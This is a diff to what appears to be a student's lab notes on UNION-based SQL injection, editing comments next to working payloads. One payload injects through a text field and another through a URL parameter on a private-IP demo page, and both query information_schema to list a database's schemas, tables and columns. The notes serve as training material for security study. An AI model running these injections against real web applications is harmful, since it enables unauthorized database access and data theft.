@@ -43,7 +43,7 @@ ________________________________________________________________________________
     Audi ' UNION SELECT 1,2,3,4,5 #
     
 ### 3-Modify Goldent Statement to include all information.
-#### UNION SELECT table_schema,table_name,column_name FROM information_schema.columns (below is altered to match out of order fields!!!!!!!!!!!!!!!!!!!!!!!!!!)
+#### UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
     Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
 
 ### 4-Craft the queries.
@@ -65,7 +65,7 @@ ________________________________________________________________________________
     10.50.33.78/uniondemo.php?Selection=3 UNION SELECT 1,2,3
 
 ### 3-Golden Statement from before.
-#### Alter the options in the middle to match the table thats out of order.
+#### Alter the options in the middle to match the table thats out of order. (OUT OF ORDER TO MATCH THE FIELDS!!!)
     10.50.33.78/uniondemo.php?Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
     
 ### 4-Modify the Goldent Statement.
